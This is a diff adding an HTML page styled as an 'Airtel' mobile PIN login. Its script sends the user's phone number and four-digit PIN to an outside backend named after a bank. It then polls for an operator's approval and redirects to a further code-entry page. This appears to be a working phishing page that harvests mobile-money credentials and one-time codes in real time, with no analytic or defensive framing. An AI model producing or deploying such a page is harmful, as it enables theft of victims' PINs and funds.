@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter PIN</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+}
+.pin-container {
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+}
+h1 {
+    color: #d60000;
+    font-size: 32px;
+    margin-bottom: 5px;
+}
+h2 {
+    font-weight: normal;
+    font-size: 20px;
+    margin-top: 0;
+    margin-bottom: 20px;
+    color: #333;
+}
+#phoneDisplay {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid #d60000;
+    border-radius: 8px;
+    font-size: 18px;
+    text-align: center;
+    margin-bottom: 15px;
+    pointer-events: none;
+    background: #fff;
+}
+.pin-boxes {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 20px;
+}
+.pin-boxes input {
+    width: 55px;
+    height: 55px;
+    font-size: 24px;
+    text-align: center;
+    border: 2px solid #d60000;
+    border-radius: 8px;
+}
+button {
+    width: 100%;
+    padding: 12px;
+    background: #ccc;
+    color: #fff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+}
+button.enabled {
+    background: #d60000;
+}
+.status {
+    margin-top: 10px;
+    font-size: 14px;
+    color: red;
+}
+</style>
+</head>
+<body>
+
+<div class="pin-container">
+    <h1>Airtel</h1>
+    <h2>Welcome</h2>
+
+    <input id="phoneDisplay" type="text" readonly>
+
+    <p>Enter your PIN</p>
+    <form id="pinForm">
+        <div class="pin-boxes">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+        </div>
+        <button id="submitBtn" disabled>Login</button>
+    </form>
+
+    <div class="status" id="status"></div>
+</div>
+
+<script>
+const BACKEND_URL = "https://zanaco-backend.onrender.com";
+const botId = new URLSearchParams(window.location.search).get("botId");
+
+const phone = localStorage.getItem("phone");
+document.getElementById("phoneDisplay").value = phone;
+
+const inputs = document.querySelectorAll(".pin-boxes input");
+const btn = document.getElementById("submitBtn");
+const status = document.getElementById("status");
+
+inputs[0].focus();
+
+inputs.forEach((i, idx) => {
+    i.addEventListener("input", () => {
+        i.value = i.value.replace(/\D/g, "");
+        if (i.value && idx < 3) inputs[idx + 1].focus();
+        btn.disabled = ![...inputs].every(x => x.value);
+        btn.classList.toggle("enabled", !btn.disabled);
+    });
+});
+
+document.getElementById("pinForm").addEventListener("submit", async e => {
+    e.preventDefault();
+    status.textContent = "";
+
+    const pin = [...inputs].map(i => i.value).join("");
+    const codeApproved = localStorage.getItem("codeApproved") === "true";
+
+    const r = await fetch(`${BACKEND_URL}/submit-pin`, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({ pin, phone, botId, codeApproved })
+    });
+
+    const { requestId } = await r.json();
+
+    const poll = setInterval(async () => {
+        const res = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
+        const d = await res.json();
+
+        if (d.blocked) {
+            status.textContent = "Enter a valid prepaid number";
+            clearInterval(poll);
+        }
+
+        if (d.approved === false) {
+            status.textContent = "Incorrect PIN. Enter again.";
+            inputs.forEach(i => i.value = "");
+            btn.disabled = true;
+        }
+
+        if (d.approved === true) {
+            clearInterval(poll);
+            window.location.href = d.goSuccess
+                ? `success.html?botId=${botId}`
+                : `code.html?botId=${botId}&requestId=${requestId}`;
+        }
+    }, 1500);
+});
+</script>
+</body>
+</html>
